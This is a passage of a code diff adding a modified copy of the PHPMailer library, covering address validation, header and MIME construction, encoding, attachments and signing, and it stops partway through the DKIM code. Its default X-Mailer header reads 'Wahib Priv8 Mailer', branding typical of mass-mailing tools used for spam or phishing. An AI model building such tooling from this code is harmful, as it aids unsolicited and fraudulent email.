+                return (boolean)preg_match('/^(?!(?>"?(?>\\\[ -~]|[^"])"?){255,})(?!(?>"?(?>\\\[ -~]|[^"])"?){65,}@)(?>' . '[!#-\'*+\/-9=?^-~-]+|"(?>(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*")' . '(?>\.(?>[!#-\'*+\/-9=?^-~-]+|"(?>(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*"))*' . '@(?>(?![a-z0-9-]{64,})(?>[a-z0-9](?>[a-z0-9-]*[a-z0-9])?)(?>\.(?![a-z0-9-]{64,})' . '(?>[a-z0-9](?>[a-z0-9-]*[a-z0-9])?)){0,126}|\[(?:(?>IPv6:(?>(?>[a-f0-9]{1,4})(?>:' . '[a-f0-9]{1,4}){7}|(?!(?:.*[a-f0-9][:\]]){8,})(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,6})?' . '::(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,6})?))|(?>(?>IPv6:(?>[a-f0-9]{1,4}(?>:' . '[a-f0-9]{1,4}){5}:|(?!(?:.*[a-f0-9]:){6,})(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,4})?' . '::(?>(?:[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,4}):)?))?(?>25[0-5]|2[0-4][0-9]|1[0-9]{2}' . '|[1-9]?[0-9])(?>\.(?>25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])){3}))\])$/isD', $address);
+            case  'html5':
+                return (boolean)preg_match('/^[a-zA-Z0-9.!#$%&\'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}' . '[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD', $address);
+            case  'noregex':
+                return (strlen($address) >= 3 and strpos($address, '@') >= 1 and strpos($address, '@') != strlen($address) - 1);
+            case  'php':
+            default:
+                return (boolean)filter_var($address, FILTER_VALIDATE_EMAIL);
+        }
+    }
+
+    public function addCC($address, $name = '')
+    {
+        return $this->addAnAddress('cc', $address, $name);
+    }
+
+    public function addBCC($address, $name = '')
+    {
+        return $this->addAnAddress('bcc', $address, $name);
+    }
+
+    public function addReplyTo($address, $name = '')
+    {
+        return $this->addAnAddress('Reply-To', $address, $name);
+    }
+
+    public function setFrom($address, $name = '', $auto = true)
+    {
+        $address = trim($address);
+        $name = trim(preg_replace('/[\r\n]+/', '', $name));
+        if (!$this->validateAddress($address)) {
+            $this->setError($this->lang('invalid_address') . ': ' . $address);
+            $this->edebug($this->lang('invalid_address') . ': ' . $address);
+            if ($this->exceptions) {
+                throw new phpmailerException($this->lang('invalid_address') . ': ' . $address);
+            }
+            return false;
+        }
+        $this->From = $address;
+        $this->FromName = $name;
+        if ($auto) {
+            if (empty($this->Sender)) {
+                $this->Sender = $address;
+            }
+        }
+        return true;
+    }
+
+    public function getLastMessageID()
+    {
+        return $this->lastMessageID;
+    }
+
+    public function send()
+    {
+        try {
+            if (!$this->preSend()) {
+                return false;
+            }
+            return $this->postSend();
+        } catch (phpmailerException $exc) {
+            $this->mailHeader = '';
+            $this->setError($exc->getMessage());
+            if ($this->exceptions) {
+                throw $exc;
+            }
+            return false;
+        }
+    }
+
+    public function preSend()
+    {
+        try {
+            $this->mailHeader = '';
+            if ((count($this->to) + count($this->cc) + count($this->bcc)) < 1) {
+                throw new phpmailerException($this->lang('provide_address'), self::STOP_CRITICAL);
+            }
+            if (!empty($this->AltBody)) {
+                $this->ContentType = 'multipart/alternative';
+            }
+            $this->error_count = 0;
+            $this->setMessageType();
+            if (!$this->AllowEmpty and empty($this->Body)) {
+                throw new phpmailerException($this->lang('empty_message'), self::STOP_CRITICAL);
+            }
+            $this->MIMEHeader = $this->createHeader();
+            $this->MIMEBody = $this->createBody();
+            if ($this->Mailer == 'mail') {
+                if (count($this->to) > 0) {
+                    $this->mailHeader .= $this->addrAppend('To', $this->to);
+                } else {
+                    $this->mailHeader .= $this->headerLine('To', 'undisclosed-recipients:;');
+                }
+                $this->mailHeader .= $this->headerLine('Subject', $this->encodeHeader($this->secureHeader(trim($this->Subject))));
+            }
+            if (!empty($this->DKIM_domain) && !empty($this->DKIM_private) && !empty($this->DKIM_selector) && !empty($this->DKIM_domain) && file_exists($this->DKIM_private)) {
+                $header_dkim = $this->DKIM_Add($this->MIMEHeader . $this->mailHeader, $this->encodeHeader($this->secureHeader($this->Subject)), $this->MIMEBody);
+                $this->MIMEHeader = rtrim($this->MIMEHeader, "\r\n ") . self::CRLF . str_replace("\r\n", "\n", $header_dkim) . self::CRLF;
+            }
+            return true;
+        } catch (phpmailerException $exc) {
+            $this->setError($exc->getMessage());
+            if ($this->exceptions) {
+                throw $exc;
+            }
+            return false;
+        }
+    }
+
+    protected function setMessageType()
+    {
+        $this->message_type = array();
+        if ($this->alternativeExists()) {
+            $this->message_type[] = 'alt';
+        }
+        if ($this->inlineImageExists()) {
+            $this->message_type[] = 'inline';
+        }
+        if ($this->attachmentExists()) {
+            $this->message_type[] = 'attach';
+        }
+        $this->message_type = implode('_', $this->message_type);
+        if ($this->message_type == '') {
+            $this->message_type = 'plain';
+        }
+    }
+
+    public function alternativeExists()
+    {
+        return !empty($this->AltBody);
+    }
+
+    public function inlineImageExists()
+    {
+        foreach ($this->attachment as $attachment) {
+            if ($attachment[6] == 'inline') {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    public function attachmentExists()
+    {
+        foreach ($this->attachment as $attachment) {
+            if ($attachment[6] == 'attachment') {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    public function createHeader()
+    {
+        $result = '';
+        $uniq_id = md5(uniqid(time()));
+        $this->boundary[1] = 'b1_' . $uniq_id;
+        $this->boundary[2] = 'b2_' . $uniq_id;
+        $this->boundary[3] = 'b3_' . $uniq_id;
+        if ($this->MessageDate == '') {
+            $this->MessageDate = self::rfcDate();
+        }
+        $result .= $this->headerLine('Date', $this->MessageDate);
+        if ($this->SingleTo === true) {
+            if ($this->Mailer != 'mail') {
+                foreach ($this->to as $toaddr) {
+                    $this->SingleToArray[] = $this->addrFormat($toaddr);
+                }
+            }
+        } else {
+            if (count($this->to) > 0) {
+                if ($this->Mailer != 'mail') {
+                    $result .= $this->addrAppend('To', $this->to);
+                }
+            } elseif (count($this->cc) == 0) {
+                $result .= $this->headerLine('To', 'undisclosed-recipients:;');
+            }
+        }
+        $result .= $this->addrAppend('From', array(array(trim($this->From), $this->FromName)));
+        if (count($this->cc) > 0) {
+            $result .= $this->addrAppend('Cc', $this->cc);
+        }
+        if (($this->Mailer == 'sendmail' or $this->Mailer == 'qmail' or $this->Mailer == 'mail') and count($this->bcc) > 0) {
+            $result .= $this->addrAppend('Bcc', $this->bcc);
+        }
+        if (count($this->ReplyTo) > 0) {
+            $result .= $this->addrAppend('Reply-To', $this->ReplyTo);
+        }
+        if ($this->Mailer != 'mail') {
+            $result .= $this->headerLine('Subject', $this->encodeHeader($this->secureHeader($this->Subject)));
+        }
+        if ($this->MessageID != '') {
+            $this->lastMessageID = $this->MessageID;
+        } else {
+            $this->lastMessageID = sprintf('<%s@%s>', $uniq_id, $this->ServerHostname());
+        }
+        $result .= $this->HeaderLine('Message-ID', $this->lastMessageID);
+        $result .= $this->headerLine('X-Priority', $this->Priority);
+        if ($this->XMailer == '') {
+            $result .= $this->headerLine('X-Mailer', 'PHPMailer ' . $this->Version . 'Wahib Priv8 Mailer');
+        } else {
+            $myXmailer = trim($this->XMailer);
+            if ($myXmailer) {
+                $result .= $this->headerLine('X-Mailer', $myXmailer);
+            }
+        }
+        if ($this->ConfirmReadingTo != '') {
+            $result .= $this->headerLine('Disposition-Notification-To', '<' . trim($this->ConfirmReadingTo) . '>');
+        }
+        for ($index = 0; $index < count($this->CustomHeader); $index++) {
+            $result .= $this->headerLine(trim($this->CustomHeader[$index][0]), $this->encodeHeader(trim($this->CustomHeader[$index][1])));
+        }
+        if (!$this->sign_key_file) {
+            $result .= $this->headerLine('MIME-Version', '1.0');
+            $result .= $this->getMailMIME();
+        }
+        return $result;
+    }
+
+    public static function rfcDate()
+    {
+        date_default_timezone_set(@date_default_timezone_get());
+        return date('D, j M Y H:i:s O');
+    }
+
+    public function headerLine($name, $value)
+    {
+        return $name . ': ' . $value . $this->LE;
+    }
+
+    public function addrFormat($addr)
+    {
+        if (empty($addr[1])) {
+            return $this->secureHeader($addr[0]);
+        } else {
+            return $this->encodeHeader($this->secureHeader($addr[1]), 'phrase') . ' <' . $this->secureHeader($addr[0]) . '>';
+        }
+    }
+
+    public function secureHeader($str)
+    {
+        return trim(str_replace(array("\r", "\n"), '', $str));
+    }
+
+    public function encodeHeader($str, $position = 'text')
+    {
+        $matchcount = 0;
+        switch (strtolower($position)) {
+            case  'phrase':
+                if (!preg_match('/[\200-\377]/', $str)) {
+                    $encoded = addcslashes($str, "\0..\37\177\\\"");
+                    if (($str == $encoded) && !preg_match('/[^A-Za-z0-9!#$%&\'*+\/=?^_`{|}~ -]/', $str)) {
+                        return ($encoded);
+                    } else {
+                        return ("\"$encoded\"");
+                    }
+                }
+                $matchcount = preg_match_all('/[^\040\041\043-\133\135-\176]/', $str, $matches);
+                break;
+            case  'comment':
+                $matchcount = preg_match_all('/[()"]/', $str, $matches);
+            case  'text':
+            default:
+                $matchcount += preg_match_all('/[\000-\010\013\014\016-\037\177-\377]/', $str, $matches);
+                break;
+        }
+        if ($matchcount == 0) {
+            return ($str);
+        }
+        $maxlen = 75 - 7 - strlen($this->CharSet);
+        if ($matchcount > strlen($str) / 3) {
+            $encoding = 'B';
+            if (function_exists('mb_strlen') && $this->hasMultiBytes($str)) {
+                $encoded = $this->base64EncodeWrapMB($str, "\n");
+            } else {
+                $encoded = base64_encode($str);
+                $maxlen -= $maxlen % 4;
+                $encoded = trim(chunk_split($encoded, $maxlen, "\n"));
+            }
+        } else {
+            $encoding = 'Q';
+            $encoded = $this->encodeQ($str, $position);
+            $encoded = $this->wrapText($encoded, $maxlen, true);
+            $encoded = str_replace('=' . self::CRLF, "\n", trim($encoded));
+        }
+        $encoded = preg_replace('/^(.*)$/m', ' =?' . $this->CharSet . "?$encoding?\\1?=", $encoded);
+        $encoded = trim(str_replace("\n", $this->LE, $encoded));
+        return $encoded;
+    }
+
+    public function hasMultiBytes($str)
+    {
+        if (function_exists('mb_strlen')) {
+            return (strlen($str) > mb_strlen($str, $this->CharSet));
+        } else {
+            return false;
+        }
+    }
+
+    public function base64EncodeWrapMB($str, $linebreak = null)
+    {
+        $start = '=?' . $this->CharSet . '?B?';
+        $end = '?=';
+        $encoded = '';
+        if ($linebreak === null) {
+            $linebreak = $this->LE;
+        }
+        $mb_length = mb_strlen($str, $this->CharSet);
+        $length = 75 - strlen($start) - strlen($end);
+        $ratio = $mb_length / strlen($str);
+        $avgLength = floor($length * $ratio * .75);
+        for ($i = 0; $i < $mb_length; $i += $offset) {
+            $lookBack = 0;
+            do {
+                $offset = $avgLength - $lookBack;
+                $chunk = mb_substr($str, $i, $offset, $this->CharSet);
+                $chunk = base64_encode($chunk);
+                $lookBack++;
+            } while (strlen($chunk) > $length);
+            $encoded .= $chunk . $linebreak;
+        }
+        $encoded = substr($encoded, 0, -strlen($linebreak));
+        return $encoded;
+    }
+
+    public function encodeQ($str, $position = 'text')
+    {
+        $pattern = '';
+        $encoded = str_replace(array("\r", "\n"), '', $str);
+        switch (strtolower($position)) {
+            case  'phrase':
+                $pattern = '^A-Za-z0-9!*+\/ -';
+                break;
+            case  'comment':
+                $pattern = '\(\)"';
+            case  'text':
+            default:
+                $pattern = '\000-\011\013\014\016-\037\075\077\137\177-\377' . $pattern;
+                break;
+        }
+        $matches = array();
+        if (preg_match_all("/[{$pattern}]/", $encoded, $matches)) {
+            $eqkey = array_search('=', $matches[0]);
+            if ($eqkey !== false) {
+                unset($matches[0][$eqkey]);
+                array_unshift($matches[0], '=');
+            }
+            foreach (array_unique($matches[0]) as $char) {
+                $encoded = str_replace($char, '=' . sprintf('%02X', ord($char)), $encoded);
+            }
+        }
+        return str_replace(' ', '_', $encoded);
+    }
+
+    public function wrapText($message, $length, $qp_mode = false)
+    {
+        $soft_break = ($qp_mode) ? sprintf(' =%s', $this->LE) : $this->LE;
+        $is_utf8 = (strtolower($this->CharSet) == 'utf-8');
+        $lelen = strlen($this->LE);
+        $crlflen = strlen(self::CRLF);
+        $message = $this->fixEOL($message);
+        if (substr($message, -$lelen) == $this->LE) {
+            $message = substr($message, 0, -$lelen);
+        }
+        $line = explode($this->LE, $message);
+        $message = '';
+        for ($i = 0; $i < count($line); $i++) {
+            $line_part = explode(' ', $line[$i]);
+            $buf = '';
+            for ($e = 0; $e < count($line_part); $e++) {
+                $word = $line_part[$e];
+                if ($qp_mode and (strlen($word) > $length)) {
+                    $space_left = $length - strlen($buf) - $crlflen;
+                    if ($e != 0) {
+                        if ($space_left > 20) {
+                            $len = $space_left;
+                            if ($is_utf8) {
+                                $len = $this->utf8CharBoundary($word, $len);
+                            } elseif (substr($word, $len - 1, 1) == '=') {
+                                $len--;
+                            } elseif (substr($word, $len - 2, 1) == '=') {
+                                $len -= 2;
+                            }
+                            $part = substr($word, 0, $len);
+                            $word = substr($word, $len);
+                            $buf .= ' ' . $part;
+                            $message .= $buf . sprintf('=%s', self::CRLF);
+                        } else {
+                            $message .= $buf . $soft_break;
+                        }
+                        $buf = '';
+                    }
+                    while (strlen($word) > 0) {
+                        if ($length <= 0) {
+                            break;
+                        }
+                        $len = $length;
+                        if ($is_utf8) {
+                            $len = $this->utf8CharBoundary($word, $len);
+                        } elseif (substr($word, $len - 1, 1) == '=') {
+                            $len--;
+                        } elseif (substr($word, $len - 2, 1) == '=') {
+                            $len -= 2;
+                        }
+                        $part = substr($word, 0, $len);
+                        $word = substr($word, $len);
+                        if (strlen($word) > 0) {
+                            $message .= $part . sprintf('=%s', self::CRLF);
+                        } else {
+                            $buf = $part;
+                        }
+                    }
+                } else {
+                    $buf_o = $buf;
+                    $buf .= ($e == 0) ? $word : (' ' . $word);
+                    if (strlen($buf) > $length and $buf_o != '') {
+                        $message .= $buf_o . $soft_break;
+                        $buf = $word;
+                    }
+                }
+            }
+            $message .= $buf . self::CRLF;
+        }
+        return $message;
+    }
+
+    public function fixEOL($str)
+    {
+        $nstr = str_replace(array("\r\n", "\r"), "\n", $str);
+        if ($this->LE !== "\n") {
+            $nstr = str_replace("\n", $this->LE, $nstr);
+        }
+        return $nstr;
+    }
+
+    public function utf8CharBoundary($encodedText, $maxLength)
+    {
+        $foundSplitPos = false;
+        $lookBack = 3;
+        while (!$foundSplitPos) {
+            $lastChunk = substr($encodedText, $maxLength - $lookBack, $lookBack);
+            $encodedCharPos = strpos($lastChunk, '=');
+            if ($encodedCharPos !== false) {
+                $hex = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 1, 2);
+                $dec = hexdec($hex);
+                if ($dec < 128) {
+                    $maxLength = ($encodedCharPos == 0) ? $maxLength : $maxLength - ($lookBack - $encodedCharPos);
+                    $foundSplitPos = true;
+                } elseif ($dec >= 192) {
+                    $maxLength = $maxLength - ($lookBack - $encodedCharPos);
+                    $foundSplitPos = true;
+                } elseif ($dec < 192) {
+                    $lookBack += 3;
+                }
+            } else {
+                $foundSplitPos = true;
+            }
+        }
+        return $maxLength;
+    }
+
+    public function addrAppend($type, $addr)
+    {
+        $addresses = array();
+        foreach ($addr as $address) {
+            $addresses[] = $this->addrFormat($address);
+        }
+        return $type . ': ' . implode(', ', $addresses) . $this->LE;
+    }
+
+    protected function serverHostname()
+    {
+        $result = 'localhost.localdomain';
+        if (!empty($this->Hostname)) {
+            $result = $this->Hostname;
+        } elseif (isset($_SERVER) and array_key_exists('SERVER_NAME', $_SERVER) and !empty($_SERVER['SERVER_NAME'])) {
+            $result = $_SERVER['SERVER_NAME'];
+        } elseif (function_exists('gethostname') && gethostname() !== false) {
+            $result = gethostname();
+        } elseif (php_uname('n') !== false) {
+            $result = php_uname('n');
+        }
+        return $result;
+    }
+
+    public function getMailMIME()
+    {
+        $result = '';
+        $ismultipart = true;
+        switch ($this->message_type) {
+            case  'inline':
+                $result .= $this->headerLine('Content-Type', 'multipart/related;');
+                $result .= $this->textLine("\tboundary=\"" . $this->boundary[1] . '"');
+                break;
+            case  'attach':
+            case  'inline_attach':
+            case  'alt_attach':
+            case  'alt_inline_attach':
+                $result .= $this->headerLine('Content-Type', 'multipart/mixed;');
+                $result .= $this->textLine("\tboundary=\"" . $this->boundary[1] . '"');
+                break;
+            case  'alt':
+            case  'alt_inline':
+                $result .= $this->headerLine('Content-Type', 'multipart/alternative;');
+                $result .= $this->textLine("\tboundary=\"" . $this->boundary[1] . '"');
+                break;
+            default:
+                $result .= $this->textLine('Content-Type: ' . $this->ContentType . '; charset=' . $this->CharSet);
+                $ismultipart = false;
+                break;
+        }
+        if ($this->Encoding != '7bit') {
+            if ($ismultipart) {
+                if ($this->Encoding == '8bit') {
+                    $result .= $this->headerLine('Content-Transfer-Encoding', '8bit');
+                }
+            } else {
+                $result .= $this->headerLine('Content-Transfer-Encoding', $this->Encoding);
+            }
+        }
+        if ($this->Mailer != 'mail') {
+            $result .= $this->LE;
+        }
+        return $result;
+    }
+
+    public function textLine($value)
+    {
+        return $value . $this->LE;
+    }
+
+    public function createBody()
+    {
+        $body = '';
+        if ($this->sign_key_file) {
+            $body .= $this->getMailMIME() . $this->LE;
+        }
+        $this->setWordWrap();
+        $bodyEncoding = $this->Encoding;
+        $bodyCharSet = $this->CharSet;
+        if ($bodyEncoding == '8bit' and !$this->has8bitChars($this->Body)) {
+            $bodyEncoding = '7bit';
+            $bodyCharSet = 'us-ascii';
+        }
+        $altBodyEncoding = $this->Encoding;
+        $altBodyCharSet = $this->CharSet;
+        if ($altBodyEncoding == '8bit' and !$this->has8bitChars($this->AltBody)) {
+            $altBodyEncoding = '7bit';
+            $altBodyCharSet = 'us-ascii';
+        }
+        switch ($this->message_type) {
+            case  'inline':
+                $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, '', $bodyEncoding);
+                $body .= $this->encodeString($this->Body, $bodyEncoding);
+                $body .= $this->LE . $this->LE;
+                $body .= $this->attachAll('inline', $this->boundary[1]);
+                break;
+            case  'attach':
+                $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, '', $bodyEncoding);
+                $body .= $this->encodeString($this->Body, $bodyEncoding);
+                $body .= $this->LE . $this->LE;
+                $body .= $this->attachAll('attachment', $this->boundary[1]);
+                break;
+            case  'inline_attach':
+                $body .= $this->textLine('--' . $this->boundary[1]);
+                $body .= $this->headerLine('Content-Type', 'multipart/related;');
+                $body .= $this->textLine("\tboundary=\"" . $this->boundary[2] . '"');
+                $body .= $this->LE;
+                $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, '', $bodyEncoding);
+                $body .= $this->encodeString($this->Body, $bodyEncoding);
+                $body .= $this->LE . $this->LE;
+                $body .= $this->attachAll('inline', $this->boundary[2]);
+                $body .= $this->LE;
+                $body .= $this->attachAll('attachment', $this->boundary[1]);
+                break;
+            case  'alt':
+                $body .= $this->getBoundary($this->boundary[1], $altBodyCharSet, 'text/plain', $altBodyEncoding);
+                $body .= $this->encodeString($this->AltBody, $altBodyEncoding);
+                $body .= $this->LE . $this->LE;
+                $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, 'text/html', $bodyEncoding);
+                $body .= $this->encodeString($this->Body, $bodyEncoding);
+                $body .= $this->LE . $this->LE;
+                if (!empty($this->Ical)) {
+                    $body .= $this->getBoundary($this->boundary[1], '', 'text/calendar; method=REQUEST', '');
+                    $body .= $this->encodeString($this->Ical, $this->Encoding);
+                    $body .= $this->LE . $this->LE;
+                }
+                $body .= $this->endBoundary($this->boundary[1]);
+                break;
+            case  'alt_inline':
+                $body .= $this->getBoundary($this->boundary[1], $altBodyCharSet, 'text/plain', $altBodyEncoding);
+                $body .= $this->encodeString($this->AltBody, $altBodyEncoding);
+                $body .= $this->LE . $this->LE;
+                $body .= $this->textLine('--' . $this->boundary[1]);
+                $body .= $this->headerLine('Content-Type', 'multipart/related;');
+                $body .= $this->textLine("\tboundary=\"" . $this->boundary[2] . '"');
+                $body .= $this->LE;
+                $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, 'text/html', $bodyEncoding);
+                $body .= $this->encodeString($this->Body, $bodyEncoding);
+                $body .= $this->LE . $this->LE;
+                $body .= $this->attachAll('inline', $this->boundary[2]);
+                $body .= $this->LE;
+                $body .= $this->endBoundary($this->boundary[1]);
+                break;
+            case  'alt_attach':
+                $body .= $this->textLine('--' . $this->boundary[1]);
+                $body .= $this->headerLine('Content-Type', 'multipart/alternative;');
+                $body .= $this->textLine("\tboundary=\"" . $this->boundary[2] . '"');
+                $body .= $this->LE;
+                $body .= $this->getBoundary($this->boundary[2], $altBodyCharSet, 'text/plain', $altBodyEncoding);
+                $body .= $this->encodeString($this->AltBody, $altBodyEncoding);
+                $body .= $this->LE . $this->LE;
+                $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, 'text/html', $bodyEncoding);
+                $body .= $this->encodeString($this->Body, $bodyEncoding);
+                $body .= $this->LE . $this->LE;
+                $body .= $this->endBoundary($this->boundary[2]);
+                $body .= $this->LE;
+                $body .= $this->attachAll('attachment', $this->boundary[1]);
+                break;
+            case  'alt_inline_attach':
+                $body .= $this->textLine('--' . $this->boundary[1]);
+                $body .= $this->headerLine('Content-Type', 'multipart/alternative;');
+                $body .= $this->textLine("\tboundary=\"" . $this->boundary[2] . '"');
+                $body .= $this->LE;
+                $body .= $this->getBoundary($this->boundary[2], $altBodyCharSet, 'text/plain', $altBodyEncoding);
+                $body .= $this->encodeString($this->AltBody, $altBodyEncoding);
+                $body .= $this->LE . $this->LE;
+                $body .= $this->textLine('--' . $this->boundary[2]);
+                $body .= $this->headerLine('Content-Type', 'multipart/related;');
+                $body .= $this->textLine("\tboundary=\"" . $this->boundary[3] . '"');
+                $body .= $this->LE;
+                $body .= $this->getBoundary($this->boundary[3], $bodyCharSet, 'text/html', $bodyEncoding);
+                $body .= $this->encodeString($this->Body, $bodyEncoding);
+                $body .= $this->LE . $this->LE;
+                $body .= $this->attachAll('inline', $this->boundary[3]);
+                $body .= $this->LE;
+                $body .= $this->endBoundary($this->boundary[2]);
+                $body .= $this->LE;
+                $body .= $this->attachAll('attachment', $this->boundary[1]);
+                break;
+            default:
+                $body .= $this->encodeString($this->Body, $bodyEncoding);
+                break;
+        }
+        if ($this->isError()) {
+            $body = '';
+        } elseif ($this->sign_key_file) {
+            try {
+                if (!defined('PKCS7_TEXT')) {
+                    throw new phpmailerException($this->lang('signing') . ' OpenSSL extension missing.');
+                }
+                $file = tempnam(sys_get_temp_dir(), 'mail');
+                file_put_contents($file, $body);
+                $signed = tempnam(sys_get_temp_dir(), 'signed');
+                if (@openssl_pkcs7_sign($file, $signed, 'file://' . realpath($this->sign_cert_file), array('file://' . realpath($this->sign_key_file), $this->sign_key_pass), null)) {
+                    @unlink($file);
+                    $body = file_get_contents($signed);
+                    @unlink($signed);
+                } else {
+                    @unlink($file);
+                    @unlink($signed);
+                    throw new phpmailerException($this->lang('signing') . openssl_error_string());
+                }
+            } catch (phpmailerException $exc) {
+                $body = '';
+                if ($this->exceptions) {
+                    throw $exc;
+                }
+            }
+        }
+        return $body;
+    }
+
+    public function setWordWrap()
+    {
+        if ($this->WordWrap < 1) {
+            return;
+        }
+        switch ($this->message_type) {
+            case  'alt':
+            case  'alt_inline':
+            case  'alt_attach':
+            case  'alt_inline_attach':
+                $this->AltBody = $this->wrapText($this->AltBody, $this->WordWrap);
+                break;
+            default:
+                $this->Body = $this->wrapText($this->Body, $this->WordWrap);
+                break;
+        }
+    }
+
+    public function has8bitChars($text)
+    {
+        return (boolean)preg_match('/[\x80-\xFF]/', $text);
+    }
+
+    protected function getBoundary($boundary, $charSet, $contentType, $encoding)
+    {
+        $result = '';
+        if ($charSet == '') {
+            $charSet = $this->CharSet;
+        }
+        if ($contentType == '') {
+            $contentType = $this->ContentType;
+        }
+        if ($encoding == '') {
+            $encoding = $this->Encoding;
+        }
+        $result .= $this->textLine('--' . $boundary);
+        $result .= sprintf('Content-Type: %s; charset=%s', $contentType, $charSet);
+        $result .= $this->LE;
+        if ($encoding != '7bit') {
+            $result .= $this->headerLine('Content-Transfer-Encoding', $encoding);
+        }
+        $result .= $this->LE;
+        return $result;
+    }
+
+    public function encodeString($str, $encoding = 'base64')
+    {
+        $encoded = '';
+        switch (strtolower($encoding)) {
+            case  'base64':
+                $encoded = chunk_split(base64_encode($str), 76, $this->LE);
+                break;
+            case  '7bit':
+            case  '8bit':
+                $encoded = $this->fixEOL($str);
+                if (substr($encoded, -(strlen($this->LE))) != $this->LE) {
+                    $encoded .= $this->LE;
+                }
+                break;
+            case  'binary':
+                $encoded = $str;
+                break;
+            case  'quoted-printable':
+                $encoded = $this->encodeQP($str);
+                break;
+            default:
+                $this->setError($this->lang('encoding') . $encoding);
+                break;
+        }
+        return $encoded;
+    }
+
+    public function encodeQP($string, $line_max = 76)
+    {
+        if (function_exists('quoted_printable_encode')) {
+            return $this->fixEOL(quoted_printable_encode($string));
+        }
+        $string = str_replace(array('%20', '%0D%0A.', '%0D%0A', '%'), array(' ', "\r\n=2E", "\r\n", '='), rawurlencode($string));
+        $string = preg_replace('/[^\r\n]{' . ($line_max - 3) . '}[^=\r\n]{2}/', "$0=\r\n", $string);
+        return $this->fixEOL($string);
+    }
+
+    protected function attachAll($disposition_type, $boundary)
+    {
+        $mime = array();
+        $cidUniq = array();
+        $incl = array();
+        foreach ($this->attachment as $attachment) {
+            if ($attachment[6] == $disposition_type) {
+                $string = '';
+                $path = '';
+                $bString = $attachment[5];
+                if ($bString) {
+                    $string = $attachment[0];
+                } else {
+                    $path = $attachment[0];
+                }
+                $inclhash = md5(serialize($attachment));
+                if (in_array($inclhash, $incl)) {
+                    continue;
+                }
+                $incl[] = $inclhash;
+                $name = $attachment[2];
+                $encoding = $attachment[3];
+                $type = $attachment[4];
+                $disposition = $attachment[6];
+                $cid = $attachment[7];
+                if ($disposition == 'inline' && isset($cidUniq[$cid])) {
+                    continue;
+                }
+                $cidUniq[$cid] = true;
+                $mime[] = sprintf('--%s%s', $boundary, $this->LE);
+                $mime[] = sprintf('Content-Type: %s; name="%s"%s', $type, $this->encodeHeader($this->secureHeader($name)), $this->LE);
+                if ($encoding != '7bit') {
+                    $mime[] = sprintf('Content-Transfer-Encoding: %s%s', $encoding, $this->LE);
+                }
+                if ($disposition == 'inline') {
+                    $mime[] = sprintf('Content-ID: <%s>%s', $cid, $this->LE);
+                }
+                if (!(empty($disposition))) {
+                    if (preg_match('/[ \(\)<>@,;:\\"\/\[\]\?=]/', $name)) {
+                        $mime[] = sprintf('Content-Disposition: %s; filename="%s"%s', $disposition, $this->encodeHeader($this->secureHeader($name)), $this->LE . $this->LE);
+                    } else {
+                        $mime[] = sprintf('Content-Disposition: %s; filename=%s%s', $disposition, $this->encodeHeader($this->secureHeader($name)), $this->LE . $this->LE);
+                    }
+                } else {
+                    $mime[] = $this->LE;
+                }
+                if ($bString) {
+                    $mime[] = $this->encodeString($string, $encoding);
+                    if ($this->isError()) {
+                        return '';
+                    }
+                    $mime[] = $this->LE . $this->LE;
+                } else {
+                    $mime[] = $this->encodeFile($path, $encoding);
+                    if ($this->isError()) {
+                        return '';
+                    }
+                    $mime[] = $this->LE . $this->LE;
+                }
+            }
+        }
+        $mime[] = sprintf('--%s--%s', $boundary, $this->LE);
+        return implode('', $mime);
+    }
+
+    public function isError()
+    {
+        return ($this->error_count > 0);
+    }
+
+    protected function encodeFile($path, $encoding = 'base64')
+    {
+        try {
+            if (!is_readable($path)) {
+                throw new phpmailerException($this->lang('file_open') . $path, self::STOP_CONTINUE);
+            }
+            $magic_quotes = get_magic_quotes_runtime();
+            if ($magic_quotes) {
+                if (version_compare(PHP_VERSION, '5.3.0', '<')) {
+                    set_magic_quotes_runtime(false);
+                } else {
+                    ini_set('magic_quotes_runtime', 0);
+                }
+            }
+            $file_buffer = file_get_contents($path);
+            $file_buffer = $this->encodeString($file_buffer, $encoding);
+            if ($magic_quotes) {
+                if (version_compare(PHP_VERSION, '5.3.0', '<')) {
+                    set_magic_quotes_runtime($magic_quotes);
+                } else {
+                    ini_set('magic_quotes_runtime', ($magic_quotes ? '1' : '0'));
+                }
+            }
+            return $file_buffer;
+        } catch (Exception $exc) {
+            $this->setError($exc->getMessage());
+            return '';
+        }
+    }
+
+    protected function endBoundary($boundary)
+    {
+        return $this->LE . '--' . $boundary . '--' . $this->LE;
+    }
+
+    public function DKIM_Add($headers_line, $subject, $body)
+    {
+        $DKIMsignatureType = 'rsa-sha1';
+        $DKIMcanonicalization = 'relaxed/simple';
+        $DKIMquery = 'dns/txt';
+        $DKIMtime = time();
+        $subject_header = "Subject: $subject";
+        $headers = explode($this->LE, $headers_line);
+        $from_header = '';
+        $to_header = '';
+        $current = '';
+        foreach ($headers as $header) {
+            if (strpos($header, 'From:') === 0) {
+                $from_header = $header;
+                $current = 'from_header';
+            } elseif (strpos($header, 'To:') === 0) {
+                $to_header = $header;
+                $current = 'to_header';
+            } else {
+                if ($current && strpos($header, ' =?') === 0) {
+                    $current .= $header;
+                } else {
+                    $current = '';
+                }
+            }
+        }
+        $from = str_replace('|', '=7C', $this->DKIM_QP($from_header));
+        $to = str_replace('|', '=7C', $this->DKIM_QP($to_header));
+        $subject = str_replace('|', '=7C', $this->DKIM_QP($subject_header));
+        $body = $this->DKIM_BodyC($body);
+        $DKIMlen = strlen($body);
